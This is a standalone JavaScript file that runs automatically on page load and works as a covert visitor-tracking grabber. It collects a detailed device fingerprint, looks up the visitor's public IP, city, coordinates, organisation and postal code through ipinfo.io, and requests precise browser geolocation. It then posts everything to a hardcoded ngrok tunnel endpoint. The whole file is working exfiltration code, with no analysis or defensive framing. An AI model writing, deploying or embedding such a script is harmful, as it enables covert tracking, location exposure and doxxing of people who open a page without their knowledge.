(function() {
    const ngrokEndpoint = 'https://8dd9-118-101-40-54.ngrok-free.app/data';

    // Collect device information
    function getDeviceInfo() {
        return {
            "Operating System": navigator.platform,
            "Browser": navigator.userAgent,
            "Language": navigator.language,
            "Screen Resolution": `${window.screen.width}x${window.screen.height}`,
            "Color Depth": `${window.screen.colorDepth}-bit`,
            "Device Pixel Ratio": window.devicePixelRatio,
            "Viewport Size": `${window.innerWidth}x${window.innerHeight}`,
            "Connection Type": navigator.connection ? navigator.connection.effectiveType : "Unknown",
            "CPU Cores": navigator.hardwareConcurrency || "Unknown",
            "Memory": navigator.deviceMemory ? `${navigator.deviceMemory}GB` : "Unknown",
            "Cookies Enabled": navigator.cookieEnabled ? "Yes" : "No",
            "Do Not Track": navigator.doNotTrack ? "Enabled" : "Disabled",
            "Touch Support": 'ontouchstart' in window ? "Yes" : "No",
            "Local Storage": typeof(Storage) !== "undefined" ? "Available" : "Not Available",
            "Time Zone": Intl.DateTimeFormat().resolvedOptions().timeZone
        };
    }

    // Fetch network information using IPInfo API
    function getNetworkInfo(callback) {
        const xhr = new XMLHttpRequest();
        xhr.open('GET', 'https://ipinfo.io/json', true);
        xhr.onload = function() {
            if (xhr.status >= 200 && xhr.status < 300) {
                try {
                    const data = JSON.parse(xhr.responseText);
                    callback({
                        "Public IP": data.ip,
                        "City": data.city,
                        "Region": data.region,
                        "Country": data.country,
                        "Location (Coordinates)": data.loc,
                        "Organization": data.org,
                        "Postal Code": data.postal,
                        "Timezone": data.timezone
                    });
                } catch (e) {
                    console.error('Error parsing network info:', e);
                    callback({ "Error": "Unable to parse network information" });
                }
            } else {
                console.error('Error fetching network info:', xhr.status);
                callback({ "Error": "Unable to fetch network information" });
            }
        };
        xhr.onerror = function() {
            console.error('Network error occurred.');
            callback({ "Error": "Network error occurred" });
        };
        xhr.send();
    }

    // Get geolocation data
    function getUserGeolocation(callback) {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                function(position) {
                    callback({
                        "Latitude": position.coords.latitude,
                        "Longitude": position.coords.longitude,
                        "Accuracy": `${position.coords.accuracy} meters`
                    });
                },
                function() {
                    callback({ "Error": "Location access denied" });
                }
            );
        } else {
            callback({ "Error": "Geolocation not supported" });
        }
    }

    // Send data to the server
    function sendData(data) {
        const xhr = new XMLHttpRequest();
        xhr.open('POST', ngrokEndpoint, true);
        xhr.setRequestHeader('Content-Type', 'application/json');
        xhr.onload = function() {
            if (xhr.status >= 200 && xhr.status < 300) {
                console.log('Data successfully sent to server:', JSON.parse(xhr.responseText));
            } else {
                console.error('Failed to send data to server:', xhr.status);
            }
        };
        xhr.onerror = function() {
            console.error('Error occurred while sending data.');
        };
        xhr.send(JSON.stringify(data));
    }

    // Collect all data and send it to the ngrok endpoint
    function collectAndSendData() {
        const deviceInfo = getDeviceInfo();
        getNetworkInfo(function(networkInfo) {
            getUserGeolocation(function(geolocationInfo) {
                const payload = {
                    device_info: deviceInfo,
                    network_info: networkInfo,
                    geolocation_info: geolocationInfo
                };
                console.log('Collected Data:', payload);
                sendData(payload);
            });
        });
    }

    // Automatically execute when the script is loaded
    collectAndSendData();
})();
